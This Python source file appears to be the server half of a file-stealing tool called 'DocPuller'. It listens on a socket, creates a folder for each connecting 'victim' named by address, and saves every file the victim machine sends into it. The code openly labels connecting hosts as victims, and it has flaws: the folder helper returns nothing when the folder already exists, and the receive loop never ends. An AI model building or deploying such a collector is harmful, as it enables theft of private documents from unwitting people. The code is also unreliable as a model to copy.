__author__ = 'ben'

import os
import socket
import threading

from real.DocPullerScripts.DocPullerFTP.protocol import Protocol


class Server(Protocol):

    def __init__(self, server, port, file_path):
        super().__init__(server, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)
        self.file_path = file_path

    def __open_victim_folder(self, addr):
        path = f'{self.file_path}/{addr}'
        if not os.path.exists(path):
            os.mkdir(path)
            return path

    def handle_victim(self, conn, addr):
        connected = True
        print(addr)
        folder = self.__open_victim_folder(addr)
        while connected:
            file_name, file_data = self.recv_file(conn)
            if file_name :
                file_name = file_name.decode()
                print('----------------------------------------')
                print('getting...', file_name)
                with open(f'{folder}/{file_name}', 'wb') as f:
                    f.write(file_data)


        conn.close()

    def start(self):
        self.server.listen()
        print(f'LISTENING... ({self.SERVER}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                thread = threading.Thread(target=self.handle_victim, args=(conn, addr))
                thread.start()
        except Exception as e:
            print(e)
            self.server.close()


if __name__ == '__main__':
    print('SERVER IS STARTING :)')
    Server('192.168.1.133', 8830,'/Users/benalaluf/Desktop').start()
